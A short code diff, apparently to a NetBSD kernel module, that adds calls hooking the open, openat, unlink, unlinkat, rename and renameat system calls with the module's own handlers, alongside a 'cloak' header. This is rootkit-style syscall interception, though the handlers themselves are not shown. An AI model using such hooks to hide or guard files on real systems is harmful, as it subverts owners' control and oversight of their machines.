@@ -7,7 +7,10 @@
  */
 #include <netbsd/cdev_init.h>
 #include <netbsd/cdev_deinit.h>
+#include <netbsd/cdev_hooks.h>
 #include <icloak.h>
+#include <kook.h>
+#include <sys/syscall.h>
 
 int cdev_init(void) {
     int errno = 0;
@@ -29,6 +32,13 @@ int cdev_init(void) {
         return 1;
     }
     */
+
+    kook(SYS_open, cdev_sys_open, (void **)&native_sys_open);
+    kook(SYS_openat, cdev_sys_openat, (void **)&native_sys_openat);
+    kook(SYS_unlink, cdev_sys_unlink, (void **)&native_sys_unlink);
+    kook(SYS_unlinkat, cdev_sys_unlinkat, (void **)&native_sys_unlinkat);
+    kook(SYS_rename, cdev_sys_rename, (void **)&native_sys_rename);
+    kook(SYS_renameat, cdev_sys_renameat, (void **)&native_sys_renameat);
 
     return errno;
 }
